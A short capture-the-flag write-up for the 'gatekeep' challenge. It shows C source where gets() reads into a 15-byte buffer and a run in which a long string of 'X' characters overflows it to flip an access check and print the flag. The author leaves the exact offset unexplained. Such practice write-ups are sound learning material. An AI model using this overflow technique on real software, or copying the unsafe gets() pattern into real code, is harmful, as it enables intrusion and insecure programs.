# gatekeep

## Author of writeup

Pat Natali

## Challenge

> If I gaslight you enough, you won't be able to get my flag! :)
>
> ```
> nc lac.tf 31121
> ```
>
> Note: The attached binary is the exact same as the one executing on the remote server.

## Solution

The source code:

```
int check(){
    char input[15];
    char pass[10];
    int access = 0;

. . .
    
    printf("Password:\n");
    gets(input);
```

Due to the way this code is written, I would expect to be able to override `access` by providing over 25 characters to the input, because `gets()` does not respect the size of the memory buffer it puts values into.

```
$ ./gatekeep    
If I gaslight you enough, you won't be able to guess my password! :)
Password:
XXXXXXXXXXXXXXXXXXXXXXXXXXXX
I swore that was the right password ...
Guess I couldn't gaslight you!
flag would be here
```

It turns out that 29 'X' is the correct amount, but I am not sure why it's 4 more bytes than expected.
